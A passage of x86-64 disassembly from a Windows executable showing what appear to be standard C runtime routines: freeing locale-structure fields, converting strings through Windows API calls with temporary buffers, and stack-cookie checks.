   140006013:	e8 d4 bd ff ff       	call   0x140001dec
   140006018:	48 8b 8b 00 02 00 00 	mov    0x200(%rbx),%rcx
   14000601f:	e8 c8 bd ff ff       	call   0x140001dec
   140006024:	48 8b 8b 08 02 00 00 	mov    0x208(%rbx),%rcx
   14000602b:	e8 bc bd ff ff       	call   0x140001dec
   140006030:	48 8b 8b 10 02 00 00 	mov    0x210(%rbx),%rcx
   140006037:	e8 b0 bd ff ff       	call   0x140001dec
   14000603c:	48 8b 8b 18 02 00 00 	mov    0x218(%rbx),%rcx
   140006043:	e8 a4 bd ff ff       	call   0x140001dec
   140006048:	48 8b 8b 20 02 00 00 	mov    0x220(%rbx),%rcx
   14000604f:	e8 98 bd ff ff       	call   0x140001dec
   140006054:	48 8b 8b 28 02 00 00 	mov    0x228(%rbx),%rcx
   14000605b:	e8 8c bd ff ff       	call   0x140001dec
   140006060:	48 8b 8b 30 02 00 00 	mov    0x230(%rbx),%rcx
   140006067:	e8 80 bd ff ff       	call   0x140001dec
   14000606c:	48 8b 8b 38 02 00 00 	mov    0x238(%rbx),%rcx
   140006073:	e8 74 bd ff ff       	call   0x140001dec
   140006078:	48 8b 8b 40 02 00 00 	mov    0x240(%rbx),%rcx
   14000607f:	e8 68 bd ff ff       	call   0x140001dec
   140006084:	48 8b 8b 48 02 00 00 	mov    0x248(%rbx),%rcx
   14000608b:	e8 5c bd ff ff       	call   0x140001dec
   140006090:	48 8b 8b 50 02 00 00 	mov    0x250(%rbx),%rcx
   140006097:	e8 50 bd ff ff       	call   0x140001dec
   14000609c:	48 8b 8b 58 02 00 00 	mov    0x258(%rbx),%rcx
   1400060a3:	e8 44 bd ff ff       	call   0x140001dec
   1400060a8:	48 8b 8b 60 02 00 00 	mov    0x260(%rbx),%rcx
   1400060af:	e8 38 bd ff ff       	call   0x140001dec
   1400060b4:	48 8b 8b 68 02 00 00 	mov    0x268(%rbx),%rcx
   1400060bb:	e8 2c bd ff ff       	call   0x140001dec
   1400060c0:	48 8b 8b 70 02 00 00 	mov    0x270(%rbx),%rcx
   1400060c7:	e8 20 bd ff ff       	call   0x140001dec
   1400060cc:	48 8b 8b 78 02 00 00 	mov    0x278(%rbx),%rcx
   1400060d3:	e8 14 bd ff ff       	call   0x140001dec
   1400060d8:	48 8b 8b 80 02 00 00 	mov    0x280(%rbx),%rcx
   1400060df:	e8 08 bd ff ff       	call   0x140001dec
   1400060e4:	48 8b 8b 88 02 00 00 	mov    0x288(%rbx),%rcx
   1400060eb:	e8 fc bc ff ff       	call   0x140001dec
   1400060f0:	48 8b 8b 90 02 00 00 	mov    0x290(%rbx),%rcx
   1400060f7:	e8 f0 bc ff ff       	call   0x140001dec
   1400060fc:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
   140006103:	e8 e4 bc ff ff       	call   0x140001dec
   140006108:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000610f:	e8 d8 bc ff ff       	call   0x140001dec
   140006114:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000611b:	e8 cc bc ff ff       	call   0x140001dec
   140006120:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   140006127:	e8 c0 bc ff ff       	call   0x140001dec
   14000612c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   140006133:	e8 b4 bc ff ff       	call   0x140001dec
   140006138:	48 83 c4 20          	add    $0x20,%rsp
   14000613c:	5b                   	pop    %rbx
   14000613d:	c3                   	ret
   14000613e:	cc                   	int3
   14000613f:	cc                   	int3
   140006140:	48 85 c9             	test   %rcx,%rcx
   140006143:	74 66                	je     0x1400061ab
   140006145:	53                   	push   %rbx
   140006146:	48 83 ec 20          	sub    $0x20,%rsp
   14000614a:	48 8b d9             	mov    %rcx,%rbx
   14000614d:	48 8b 09             	mov    (%rcx),%rcx
   140006150:	48 3b 0d b9 5c 00 00 	cmp    0x5cb9(%rip),%rcx        # 0x14000be10
   140006157:	74 05                	je     0x14000615e
   140006159:	e8 8e bc ff ff       	call   0x140001dec
   14000615e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140006162:	48 3b 0d af 5c 00 00 	cmp    0x5caf(%rip),%rcx        # 0x14000be18
   140006169:	74 05                	je     0x140006170
   14000616b:	e8 7c bc ff ff       	call   0x140001dec
   140006170:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140006174:	48 3b 0d a5 5c 00 00 	cmp    0x5ca5(%rip),%rcx        # 0x14000be20
   14000617b:	74 05                	je     0x140006182
   14000617d:	e8 6a bc ff ff       	call   0x140001dec
   140006182:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140006186:	48 3b 0d db 5c 00 00 	cmp    0x5cdb(%rip),%rcx        # 0x14000be68
   14000618d:	74 05                	je     0x140006194
   14000618f:	e8 58 bc ff ff       	call   0x140001dec
   140006194:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140006198:	48 3b 0d d1 5c 00 00 	cmp    0x5cd1(%rip),%rcx        # 0x14000be70
   14000619f:	74 05                	je     0x1400061a6
   1400061a1:	e8 46 bc ff ff       	call   0x140001dec
   1400061a6:	48 83 c4 20          	add    $0x20,%rsp
   1400061aa:	5b                   	pop    %rbx
   1400061ab:	c3                   	ret
   1400061ac:	48 85 c9             	test   %rcx,%rcx
   1400061af:	0f 84 00 01 00 00    	je     0x1400062b5
   1400061b5:	53                   	push   %rbx
   1400061b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400061ba:	48 8b d9             	mov    %rcx,%rbx
   1400061bd:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400061c1:	48 3b 0d 60 5c 00 00 	cmp    0x5c60(%rip),%rcx        # 0x14000be28
   1400061c8:	74 05                	je     0x1400061cf
   1400061ca:	e8 1d bc ff ff       	call   0x140001dec
   1400061cf:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400061d3:	48 3b 0d 56 5c 00 00 	cmp    0x5c56(%rip),%rcx        # 0x14000be30
   1400061da:	74 05                	je     0x1400061e1
   1400061dc:	e8 0b bc ff ff       	call   0x140001dec
   1400061e1:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400061e5:	48 3b 0d 4c 5c 00 00 	cmp    0x5c4c(%rip),%rcx        # 0x14000be38
   1400061ec:	74 05                	je     0x1400061f3
   1400061ee:	e8 f9 bb ff ff       	call   0x140001dec
   1400061f3:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400061f7:	48 3b 0d 42 5c 00 00 	cmp    0x5c42(%rip),%rcx        # 0x14000be40
   1400061fe:	74 05                	je     0x140006205
   140006200:	e8 e7 bb ff ff       	call   0x140001dec
   140006205:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140006209:	48 3b 0d 38 5c 00 00 	cmp    0x5c38(%rip),%rcx        # 0x14000be48
   140006210:	74 05                	je     0x140006217
   140006212:	e8 d5 bb ff ff       	call   0x140001dec
   140006217:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000621b:	48 3b 0d 2e 5c 00 00 	cmp    0x5c2e(%rip),%rcx        # 0x14000be50
   140006222:	74 05                	je     0x140006229
   140006224:	e8 c3 bb ff ff       	call   0x140001dec
   140006229:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   14000622d:	48 3b 0d 24 5c 00 00 	cmp    0x5c24(%rip),%rcx        # 0x14000be58
   140006234:	74 05                	je     0x14000623b
   140006236:	e8 b1 bb ff ff       	call   0x140001dec
   14000623b:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000623f:	48 3b 0d 32 5c 00 00 	cmp    0x5c32(%rip),%rcx        # 0x14000be78
   140006246:	74 05                	je     0x14000624d
   140006248:	e8 9f bb ff ff       	call   0x140001dec
   14000624d:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140006251:	48 3b 0d 28 5c 00 00 	cmp    0x5c28(%rip),%rcx        # 0x14000be80
   140006258:	74 05                	je     0x14000625f
   14000625a:	e8 8d bb ff ff       	call   0x140001dec
   14000625f:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140006263:	48 3b 0d 1e 5c 00 00 	cmp    0x5c1e(%rip),%rcx        # 0x14000be88
   14000626a:	74 05                	je     0x140006271
   14000626c:	e8 7b bb ff ff       	call   0x140001dec
   140006271:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140006278:	48 3b 0d 11 5c 00 00 	cmp    0x5c11(%rip),%rcx        # 0x14000be90
   14000627f:	74 05                	je     0x140006286
   140006281:	e8 66 bb ff ff       	call   0x140001dec
   140006286:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   14000628d:	48 3b 0d 04 5c 00 00 	cmp    0x5c04(%rip),%rcx        # 0x14000be98
   140006294:	74 05                	je     0x14000629b
   140006296:	e8 51 bb ff ff       	call   0x140001dec
   14000629b:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   1400062a2:	48 3b 0d f7 5b 00 00 	cmp    0x5bf7(%rip),%rcx        # 0x14000bea0
   1400062a9:	74 05                	je     0x1400062b0
   1400062ab:	e8 3c bb ff ff       	call   0x140001dec
   1400062b0:	48 83 c4 20          	add    $0x20,%rsp
   1400062b4:	5b                   	pop    %rbx
   1400062b5:	c3                   	ret
   1400062b6:	cc                   	int3
   1400062b7:	cc                   	int3
   1400062b8:	40 55                	rex push %rbp
   1400062ba:	41 54                	push   %r12
   1400062bc:	41 55                	push   %r13
   1400062be:	41 56                	push   %r14
   1400062c0:	41 57                	push   %r15
   1400062c2:	48 83 ec 50          	sub    $0x50,%rsp
   1400062c6:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   1400062cb:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   1400062cf:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   1400062d3:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   1400062d7:	48 8b 05 92 51 00 00 	mov    0x5192(%rip),%rax        # 0x14000b470
   1400062de:	48 33 c5             	xor    %rbp,%rax
   1400062e1:	48 89 45 08          	mov    %rax,0x8(%rbp)
   1400062e5:	8b 5d 60             	mov    0x60(%rbp),%ebx
   1400062e8:	33 ff                	xor    %edi,%edi
   1400062ea:	4d 8b f1             	mov    %r9,%r14
   1400062ed:	45 8b f8             	mov    %r8d,%r15d
   1400062f0:	89 55 00             	mov    %edx,0x0(%rbp)
   1400062f3:	85 db                	test   %ebx,%ebx
   1400062f5:	7e 2a                	jle    0x140006321
   1400062f7:	44 8b d3             	mov    %ebx,%r10d
   1400062fa:	49 8b c1             	mov    %r9,%rax
   1400062fd:	41 ff ca             	dec    %r10d
   140006300:	40 38 38             	cmp    %dil,(%rax)
   140006303:	74 0c                	je     0x140006311
   140006305:	48 ff c0             	inc    %rax
   140006308:	45 85 d2             	test   %r10d,%r10d
   14000630b:	75 f0                	jne    0x1400062fd
   14000630d:	41 83 ca ff          	or     $0xffffffff,%r10d
   140006311:	8b c3                	mov    %ebx,%eax
   140006313:	41 2b c2             	sub    %r10d,%eax
   140006316:	ff c8                	dec    %eax
   140006318:	3b c3                	cmp    %ebx,%eax
   14000631a:	8d 58 01             	lea    0x1(%rax),%ebx
   14000631d:	7c 02                	jl     0x140006321
   14000631f:	8b d8                	mov    %eax,%ebx
   140006321:	44 8b 65 78          	mov    0x78(%rbp),%r12d
   140006325:	8b f7                	mov    %edi,%esi
   140006327:	45 85 e4             	test   %r12d,%r12d
   14000632a:	75 07                	jne    0x140006333
   14000632c:	48 8b 01             	mov    (%rcx),%rax
   14000632f:	44 8b 60 04          	mov    0x4(%rax),%r12d
   140006333:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   140006339:	44 8b cb             	mov    %ebx,%r9d
   14000633c:	4d 8b c6             	mov    %r14,%r8
   14000633f:	1b d2                	sbb    %edx,%edx
   140006341:	41 8b cc             	mov    %r12d,%ecx
   140006344:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140006348:	83 e2 08             	and    $0x8,%edx
   14000634b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006350:	ff c2                	inc    %edx
   140006352:	ff 15 38 1d 00 00    	call   *0x1d38(%rip)        # 0x140008090
   140006358:	4c 63 e8             	movslq %eax,%r13
   14000635b:	85 c0                	test   %eax,%eax
   14000635d:	75 07                	jne    0x140006366
   14000635f:	33 c0                	xor    %eax,%eax
   140006361:	e9 f6 01 00 00       	jmp    0x14000655c
   140006366:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000636d:	ff ff 0f 
   140006370:	85 c0                	test   %eax,%eax
   140006372:	7e 5e                	jle    0x1400063d2
   140006374:	33 d2                	xor    %edx,%edx
   140006376:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000637a:	49 f7 f5             	div    %r13
   14000637d:	48 83 f8 02          	cmp    $0x2,%rax
   140006381:	72 4f                	jb     0x1400063d2
   140006383:	4b 8d 4c 2d 10       	lea    0x10(%r13,%r13,1),%rcx
   140006388:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000638f:	77 2a                	ja     0x1400063bb
   140006391:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140006395:	48 3b c1             	cmp    %rcx,%rax
   140006398:	77 03                	ja     0x14000639d
   14000639a:	49 8b c0             	mov    %r8,%rax
   14000639d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400063a1:	e8 6a 04 00 00       	call   0x140006810
   1400063a6:	48 2b e0             	sub    %rax,%rsp
   1400063a9:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   1400063ae:	48 85 ff             	test   %rdi,%rdi
   1400063b1:	74 ac                	je     0x14000635f
   1400063b3:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   1400063b9:	eb 13                	jmp    0x1400063ce
   1400063bb:	e8 6c ba ff ff       	call   0x140001e2c
   1400063c0:	48 8b f8             	mov    %rax,%rdi
   1400063c3:	48 85 c0             	test   %rax,%rax
   1400063c6:	74 0a                	je     0x1400063d2
   1400063c8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1400063ce:	48 83 c7 10          	add    $0x10,%rdi
   1400063d2:	48 85 ff             	test   %rdi,%rdi
   1400063d5:	74 88                	je     0x14000635f
   1400063d7:	44 8b cb             	mov    %ebx,%r9d
   1400063da:	4d 8b c6             	mov    %r14,%r8
   1400063dd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400063e2:	41 8b cc             	mov    %r12d,%ecx
   1400063e5:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400063ea:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400063ef:	ff 15 9b 1c 00 00    	call   *0x1c9b(%rip)        # 0x140008090
   1400063f5:	85 c0                	test   %eax,%eax
   1400063f7:	0f 84 4c 01 00 00    	je     0x140006549
   1400063fd:	44 8b 75 00          	mov    0x0(%rbp),%r14d
   140006401:	21 74 24 28          	and    %esi,0x28(%rsp)
   140006405:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   14000640a:	41 8b ce             	mov    %r14d,%ecx
   14000640d:	45 8b cd             	mov    %r13d,%r9d
   140006410:	4c 8b c7             	mov    %rdi,%r8
   140006413:	41 8b d7             	mov    %r15d,%edx
   140006416:	ff 15 7c 1c 00 00    	call   *0x1c7c(%rip)        # 0x140008098
   14000641c:	48 63 f0             	movslq %eax,%rsi
   14000641f:	85 c0                	test   %eax,%eax
   140006421:	0f 84 22 01 00 00    	je     0x140006549
   140006427:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000642d:	45 85 f8             	test   %r15d,%r8d
   140006430:	74 37                	je     0x140006469
   140006432:	8b 4d 70             	mov    0x70(%rbp),%ecx
   140006435:	85 c9                	test   %ecx,%ecx
   140006437:	0f 84 0c 01 00 00    	je     0x140006549
   14000643d:	3b f1                	cmp    %ecx,%esi
   14000643f:	0f 8f 04 01 00 00    	jg     0x140006549
   140006445:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140006449:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000644d:	45 8b cd             	mov    %r13d,%r9d
   140006450:	4c 8b c7             	mov    %rdi,%r8
   140006453:	41 8b d7             	mov    %r15d,%edx
   140006456:	41 8b ce             	mov    %r14d,%ecx
   140006459:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000645e:	ff 15 34 1c 00 00    	call   *0x1c34(%rip)        # 0x140008098
   140006464:	e9 e0 00 00 00       	jmp    0x140006549
   140006469:	85 c0                	test   %eax,%eax
   14000646b:	7e 67                	jle    0x1400064d4
   14000646d:	33 d2                	xor    %edx,%edx
   14000646f:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140006473:	48 f7 f6             	div    %rsi
   140006476:	48 83 f8 02          	cmp    $0x2,%rax
   14000647a:	72 58                	jb     0x1400064d4
   14000647c:	48 8d 4c 36 10       	lea    0x10(%rsi,%rsi,1),%rcx
   140006481:	49 3b c8             	cmp    %r8,%rcx
   140006484:	77 35                	ja     0x1400064bb
   140006486:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000648a:	48 3b c1             	cmp    %rcx,%rax
   14000648d:	77 0a                	ja     0x140006499
   14000648f:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140006496:	ff ff 0f 
   140006499:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000649d:	e8 6e 03 00 00       	call   0x140006810
   1400064a2:	48 2b e0             	sub    %rax,%rsp
   1400064a5:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   1400064aa:	48 85 db             	test   %rbx,%rbx
   1400064ad:	0f 84 96 00 00 00    	je     0x140006549
   1400064b3:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   1400064b9:	eb 13                	jmp    0x1400064ce
   1400064bb:	e8 6c b9 ff ff       	call   0x140001e2c
   1400064c0:	48 8b d8             	mov    %rax,%rbx
   1400064c3:	48 85 c0             	test   %rax,%rax
   1400064c6:	74 0e                	je     0x1400064d6
   1400064c8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1400064ce:	48 83 c3 10          	add    $0x10,%rbx
   1400064d2:	eb 02                	jmp    0x1400064d6
   1400064d4:	33 db                	xor    %ebx,%ebx
   1400064d6:	48 85 db             	test   %rbx,%rbx
   1400064d9:	74 6e                	je     0x140006549
   1400064db:	45 8b cd             	mov    %r13d,%r9d
   1400064de:	4c 8b c7             	mov    %rdi,%r8
   1400064e1:	41 8b d7             	mov    %r15d,%edx
   1400064e4:	41 8b ce             	mov    %r14d,%ecx
   1400064e7:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400064eb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400064f0:	ff 15 a2 1b 00 00    	call   *0x1ba2(%rip)        # 0x140008098
   1400064f6:	33 c9                	xor    %ecx,%ecx
   1400064f8:	85 c0                	test   %eax,%eax
   1400064fa:	74 3c                	je     0x140006538
   1400064fc:	8b 45 70             	mov    0x70(%rbp),%eax
   1400064ff:	33 d2                	xor    %edx,%edx
   140006501:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140006506:	44 8b ce             	mov    %esi,%r9d
   140006509:	4c 8b c3             	mov    %rbx,%r8
   14000650c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006511:	85 c0                	test   %eax,%eax
   140006513:	75 0b                	jne    0x140006520
   140006515:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140006519:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000651e:	eb 0d                	jmp    0x14000652d
   140006520:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140006524:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140006528:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000652d:	41 8b cc             	mov    %r12d,%ecx
   140006530:	ff 15 7a 1b 00 00    	call   *0x1b7a(%rip)        # 0x1400080b0
   140006536:	8b f0                	mov    %eax,%esi
   140006538:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000653c:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140006542:	75 05                	jne    0x140006549
   140006544:	e8 a3 b8 ff ff       	call   0x140001dec
   140006549:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000654d:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140006553:	75 05                	jne    0x14000655a
   140006555:	e8 92 b8 ff ff       	call   0x140001dec
   14000655a:	8b c6                	mov    %esi,%eax
   14000655c:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140006560:	48 33 cd             	xor    %rbp,%rcx
   140006563:	e8 c8 e1 ff ff       	call   0x140004730
   140006568:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000656c:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   140006570:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   140006574:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   140006578:	41 5f                	pop    %r15
   14000657a:	41 5e                	pop    %r14
   14000657c:	41 5d                	pop    %r13
   14000657e:	41 5c                	pop    %r12
   140006580:	5d                   	pop    %rbp
   140006581:	c3                   	ret
   140006582:	cc                   	int3
   140006583:	cc                   	int3
   140006584:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006589:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000658e:	57                   	push   %rdi
   14000658f:	48 83 ec 70          	sub    $0x70,%rsp
   140006593:	8b f2                	mov    %edx,%esi
   140006595:	48 8b d1             	mov    %rcx,%rdx
   140006598:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000659d:	49 8b d9             	mov    %r9,%rbx
   1400065a0:	41 8b f8             	mov    %r8d,%edi
   1400065a3:	e8 a0 ed ff ff       	call   0x140005348
   1400065a8:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   1400065af:	44 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%r11d
   1400065b6:	00 
   1400065b7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400065bc:	44 89 5c 24 40       	mov    %r11d,0x40(%rsp)
   1400065c1:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400065c5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   1400065cc:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400065d0:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   1400065d7:	00 
   1400065d8:	4c 8b cb             	mov    %rbx,%r9
   1400065db:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400065e0:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   1400065e7:	44 8b c7             	mov    %edi,%r8d
   1400065ea:	8b d6                	mov    %esi,%edx
   1400065ec:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400065f0:	e8 c3 fc ff ff       	call   0x1400062b8
   1400065f5:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   1400065fa:	74 0c                	je     0x140006608
   1400065fc:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140006601:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140006608:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000660d:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140006611:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140006615:	49 8b e3             	mov    %r11,%rsp
   140006618:	5f                   	pop    %rdi
   140006619:	c3                   	ret
   14000661a:	cc                   	int3
   14000661b:	cc                   	int3
   14000661c:	40 55                	rex push %rbp
   14000661e:	41 54                	push   %r12
   140006620:	41 55                	push   %r13
   140006622:	41 56                	push   %r14
   140006624:	41 57                	push   %r15
   140006626:	48 83 ec 40          	sub    $0x40,%rsp
   14000662a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000662f:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   140006633:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   140006637:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000663b:	48 8b 05 2e 4e 00 00 	mov    0x4e2e(%rip),%rax        # 0x14000b470
   140006642:	48 33 c5             	xor    %rbp,%rax
   140006645:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140006649:	8b 75 68             	mov    0x68(%rbp),%esi
   14000664c:	33 ff                	xor    %edi,%edi
   14000664e:	45 8b e9             	mov    %r9d,%r13d
   140006651:	4d 8b f0             	mov    %r8,%r14
   140006654:	44 8b fa             	mov    %edx,%r15d
   140006657:	85 f6                	test   %esi,%esi
   140006659:	75 06                	jne    0x140006661
   14000665b:	48 8b 01             	mov    (%rcx),%rax
   14000665e:	8b 70 04             	mov    0x4(%rax),%esi
   140006661:	f7 5d 70             	negl   0x70(%rbp)
   140006664:	8b ce                	mov    %esi,%ecx
   140006666:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000666a:	1b d2                	sbb    %edx,%edx
   14000666c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006671:	83 e2 08             	and    $0x8,%edx
   140006674:	ff c2                	inc    %edx
   140006676:	ff 15 14 1a 00 00    	call   *0x1a14(%rip)        # 0x140008090
   14000667c:	4c 63 e0             	movslq %eax,%r12
   14000667f:	85 c0                	test   %eax,%eax
   140006681:	75 07                	jne    0x14000668a
   140006683:	33 c0                	xor    %eax,%eax
   140006685:	e9 ca 00 00 00       	jmp    0x140006754
   14000668a:	7e 67                	jle    0x1400066f3
   14000668c:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   140006693:	ff ff 7f 
   140006696:	4c 3b e0             	cmp    %rax,%r12
   140006699:	77 58                	ja     0x1400066f3
   14000669b:	4b 8d 4c 24 10       	lea    0x10(%r12,%r12,1),%rcx
   1400066a0:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1400066a7:	77 31                	ja     0x1400066da
   1400066a9:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400066ad:	48 3b c1             	cmp    %rcx,%rax
   1400066b0:	77 0a                	ja     0x1400066bc
   1400066b2:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   1400066b9:	ff ff 0f 
   1400066bc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400066c0:	e8 4b 01 00 00       	call   0x140006810
   1400066c5:	48 2b e0             	sub    %rax,%rsp
   1400066c8:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   1400066cd:	48 85 db             	test   %rbx,%rbx
   1400066d0:	74 b1                	je     0x140006683
   1400066d2:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   1400066d8:	eb 13                	jmp    0x1400066ed
   1400066da:	e8 4d b7 ff ff       	call   0x140001e2c
   1400066df:	48 8b d8             	mov    %rax,%rbx
   1400066e2:	48 85 c0             	test   %rax,%rax
   1400066e5:	74 0f                	je     0x1400066f6
   1400066e7:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1400066ed:	48 83 c3 10          	add    $0x10,%rbx
   1400066f1:	eb 03                	jmp    0x1400066f6
   1400066f3:	48 8b df             	mov    %rdi,%rbx
   1400066f6:	48 85 db             	test   %rbx,%rbx
   1400066f9:	74 88                	je     0x140006683
   1400066fb:	4d 8b c4             	mov    %r12,%r8
   1400066fe:	33 d2                	xor    %edx,%edx
   140006700:	48 8b cb             	mov    %rbx,%rcx
   140006703:	4d 03 c0             	add    %r8,%r8
   140006706:	e8 15 f2 ff ff       	call   0x140005920
   14000670b:	45 8b cd             	mov    %r13d,%r9d
   14000670e:	4d 8b c6             	mov    %r14,%r8
   140006711:	ba 01 00 00 00       	mov    $0x1,%edx
   140006716:	8b ce                	mov    %esi,%ecx
   140006718:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000671d:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006722:	ff 15 68 19 00 00    	call   *0x1968(%rip)        # 0x140008090
   140006728:	85 c0                	test   %eax,%eax
   14000672a:	74 15                	je     0x140006741
   14000672c:	4c 8b 4d 60          	mov    0x60(%rbp),%r9
   140006730:	44 8b c0             	mov    %eax,%r8d
   140006733:	48 8b d3             	mov    %rbx,%rdx
   140006736:	41 8b cf             	mov    %r15d,%ecx
   140006739:	ff 15 49 19 00 00    	call   *0x1949(%rip)        # 0x140008088
   14000673f:	8b f8                	mov    %eax,%edi
   140006741:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140006745:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000674b:	75 05                	jne    0x140006752
   14000674d:	e8 9a b6 ff ff       	call   0x140001dec
   140006752:	8b c7                	mov    %edi,%eax
   140006754:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   140006758:	48 33 cd             	xor    %rbp,%rcx
   14000675b:	e8 d0 df ff ff       	call   0x140004730
   140006760:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   140006764:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   140006768:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000676c:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   140006770:	41 5f                	pop    %r15
   140006772:	41 5e                	pop    %r14
   140006774:	41 5d                	pop    %r13
   140006776:	41 5c                	pop    %r12
   140006778:	5d                   	pop    %rbp
   140006779:	c3                   	ret
   14000677a:	cc                   	int3
   14000677b:	cc                   	int3
   14000677c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006781:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006786:	57                   	push   %rdi
